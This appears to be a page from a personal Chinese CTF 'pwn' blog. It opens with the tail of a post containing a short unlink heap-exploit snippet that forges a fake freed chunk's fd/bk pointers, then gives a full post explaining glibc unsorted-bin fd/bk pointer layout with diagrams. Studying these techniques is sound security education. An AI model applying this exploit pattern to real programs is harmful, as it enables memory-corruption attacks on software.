<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;samll&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;big&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;large&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(small_buf_addr - <span class="number">0x18</span>) + p64(small_buf_addr - <span class="number">0x10</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>触发unlink一定要伪造一个free掉的堆块在指针处，因为unlink比较是和头部比较，而数组中存储的是指针的值，所以要伪造头部在指针处才能绕过保护</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/18/unsortbins/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="和方煜">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小小pwn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/18/unsortbins/" class="post-title-link" itemprop="url">unsortbins</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-11-18 00:00:05 / 修改时间：00:10:25" itemprop="dateCreated datePublished" datetime="2025-11-18T00:00:05+08:00">2025-11-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <hr>
<p>以下是关于 <code>unsorted bin</code> 的 <code>bin头</code> 的 <code>fd</code> 和 <code>bk</code> 指向的详细解释和结构图，涵盖不同链表情形：</p>
<hr>
<h3 id="1-基础规则"><a href="#1-基础规则" class="headerlink" title="1. 基础规则"></a><strong>1. 基础规则</strong></h3><p>在 <code>glibc</code> 的堆管理中：</p>
<ul>
<li><code>unsorted bin</code> <strong>是双向循环链表</strong>，遵循 FIFO（先进先出）规则。</li>
<li><code>bin头</code> <strong>的</strong> <code>fd</code>：指向链表的第一个 chunk（最靠近头部的 chunk）。</li>
<li><code>bin头</code> <strong>的</strong> <code>bk</code>：指向链表的最后一个 chunk（最靠近尾部的 chunk）。</li>
<li><strong>空链表时</strong>：<code>fd</code> 和 <code>bk</code> 均指向 <code>bin头</code> 自身。</li>
</ul>
<hr>
<h3 id="2-不同链表情形的结构图"><a href="#2-不同链表情形的结构图" class="headerlink" title="2. 不同链表情形的结构图"></a><strong>2. 不同链表情形的结构图</strong></h3><h4 id="1-空链表"><a href="#1-空链表" class="headerlink" title="(1) 空链表"></a><strong>(1) 空链表</strong></h4><p>当 <code>unsorted bin</code> 为空时，<code>fd</code> 和 <code>bk</code> 均指向自身：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+-------------------+</span><br><span class="line">|      bin头        |</span><br><span class="line">| fd = &amp;bin头       |</span><br><span class="line">| bk = &amp;bin头       |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure>

<h4 id="2-单个-chunk（chunk1）"><a href="#2-单个-chunk（chunk1）" class="headerlink" title="(2) 单个 chunk（chunk1）"></a><strong>(2) 单个 chunk（</strong><code>chunk1</code><strong>）</strong></h4><p>插入一个 chunk 后，链表形成循环：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+-------------------+       +-------------------+</span><br><span class="line">|      bin头        | &lt;---&gt; |      chunk1       |</span><br><span class="line">| fd = chunk1       |       | fd = &amp;bin头        |</span><br><span class="line">| bk = chunk1       |       | bk = &amp;bin头        |</span><br><span class="line">+-------------------+       +-------------------+</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>逻辑</strong>：<code>bin头</code> 的 <code>fd</code> 和 <code>bk</code> 均指向 <code>chunk1</code>，<code>chunk1</code> 的 <code>fd</code> 和 <code>bk</code> 回指 <code>bin头</code>。</li>
</ul>
<h4 id="3-两个-chunk（chunk1-和-chunk2）"><a href="#3-两个-chunk（chunk1-和-chunk2）" class="headerlink" title="(3) 两个 chunk（chunk1 和 chunk2）"></a><strong>(3) 两个 chunk（</strong><code>chunk1</code> <strong>和</strong> <code>chunk2</code><strong>）</strong></h4><p>插入第二个 chunk 到链表头部后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+-------------------+       +-------------------+       +-------------------+</span><br><span class="line">|      bin头        | &lt;---&gt; |      chunk2       | &lt;---&gt; |      chunk1       |</span><br><span class="line">| fd = chunk2       |       | fd = chunk1       |       | fd = &amp;bin头        |</span><br><span class="line">| bk = chunk1       |       | bk = &amp;bin头        |       | bk = chunk2       |</span><br><span class="line">+-------------------+       +-------------------+       +-------------------+</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>关键指针</strong>：</p>
</li>
<li><p><code>bin头.fd</code> 指向第一个 chunk（<code>chunk2</code>）。</p>
</li>
<li><p><code>bin头.bk</code> 指向最后一个 chunk（<code>chunk1</code>）。</p>
</li>
<li><p><code>chunk2.fd</code> 指向 <code>chunk1</code>，<code>chunk2.bk</code> 指向 <code>bin头</code>。</p>
</li>
<li><p><code>chunk1.fd</code> 指向 <code>bin头</code>，<code>chunk1.bk</code> 指向 <code>chunk2</code>。</p>
</li>
</ul>
<h4 id="4-三个-chunk（chunk1、chunk2、chunk3）"><a href="#4-三个-chunk（chunk1、chunk2、chunk3）" class="headerlink" title="(4) 三个 chunk（chunk1、chunk2、chunk3）"></a><strong>(4) 三个 chunk（</strong><code>chunk1</code><strong>、</strong><code>chunk2</code><strong>、</strong><code>chunk3</code><strong>）</strong></h4><p>插入第三个 chunk 到链表头部后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+-------------------+       +-------------------+       +-------------------+       +-------------------+</span><br><span class="line">|      bin头        | &lt;---&gt; |      chunk3       | &lt;---&gt; |      chunk2       | &lt;---&gt; |      chunk1       |</span><br><span class="line">| fd = chunk3       |       | fd = chunk2       |       | fd = chunk1       |       | fd = &amp;bin头        |</span><br><span class="line">| bk = chunk1       |       | bk = &amp;bin头        |       | bk = chunk3       |       | bk = chunk2       |</span><br><span class="line">+-------------------+       +-------------------+       +-------------------+       +-------------------+</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>逻辑</strong>：新 chunk 插入链表头部，<code>bin头.bk</code> 始终指向尾部 chunk（<code>chunk1</code>）。</li>
</ul>
<hr>
<h3 id="3-动态操作示例"><a href="#3-动态操作示例" class="headerlink" title="3. 动态操作示例"></a><strong>3. 动态操作示例</strong></h3><h4 id="1-插入新-chunk"><a href="#1-插入新-chunk" class="headerlink" title="(1) 插入新 chunk"></a><strong>(1) 插入新 chunk</strong></h4><p>向空链表插入 <code>chunk1</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[初始] 空链表：</span><br><span class="line">bin头.fd = &amp;bin头</span><br><span class="line">bin头.bk = &amp;bin头</span><br><span class="line"></span><br><span class="line">[插入 chunk1]：</span><br><span class="line">bin头.fd = chunk1</span><br><span class="line">bin头.bk = chunk1</span><br><span class="line">chunk1.fd = &amp;bin头</span><br><span class="line">chunk1.bk = &amp;bin头</span><br></pre></td></tr></table></figure>

<h4 id="2-从链表中移除-chunk"><a href="#2-从链表中移除-chunk" class="headerlink" title="(2) 从链表中移除 chunk"></a><strong>(2) 从链表中移除 chunk</strong></h4><p>从两个 chunk 的链表中移除 <code>chunk1</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[移除前]：</span><br><span class="line">bin头.fd = chunk2</span><br><span class="line">bin头.bk = chunk1</span><br><span class="line">chunk2.fd = chunk1</span><br><span class="line">chunk2.bk = &amp;bin头</span><br><span class="line">chunk1.fd = &amp;bin头</span><br><span class="line">chunk1.bk = chunk2</span><br><span class="line"></span><br><span class="line">[移除 chunk1 后]：</span><br><span class="line">+-------------------+       +-------------------+</span><br><span class="line">|      bin头        | &lt;---&gt; |      chunk2       |</span><br><span class="line">| fd = chunk2       |       | fd = &amp;bin头        |</span><br><span class="line">| bk = chunk2       |       | bk = &amp;bin头        |</span><br><span class="line">+-------------------+       +-------------------+</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a><strong>4. 总结</strong></h3><ul>
<li><code>fd</code> <strong>和</strong> <code>bk</code> <strong>的指向规则</strong>：</li>
</ul>
<table>
<thead>
<tr>
<th>链表情形</th>
<th><code>bin头.fd</code> 指向</th>
<th><code>bin头.bk</code> 指向</th>
</tr>
</thead>
<tbody><tr>
<td>空链表</td>
<td><code>&amp;bin头</code></td>
<td><code>&amp;bin头</code></td>
</tr>
<tr>
<td>单个 chunk</td>
<td>第一个 chunk</td>
<td>第一个 chunk</td>
</tr>
<tr>
<td>多个 chunk</td>
<td>第一个 chunk</td>
<td>最后一个 chunk</td>
</tr>
</tbody></table>
<ul>
<li><p><strong>链表操作规则</strong>：</p>
</li>
<li><p><strong>插入</strong>：新 chunk 插入链表头部（<code>bin头.fd</code> 更新为新 chunk）。</p>
</li>
<li><p><strong>移除</strong>：从头部或尾部移除 chunk，保持双向链表的完整性。</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">和方煜</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">25</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">和方煜</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">123k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">1:52</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>




        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>



// 在最后添加
<script src="/js/code-unfold.js"></script>


  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
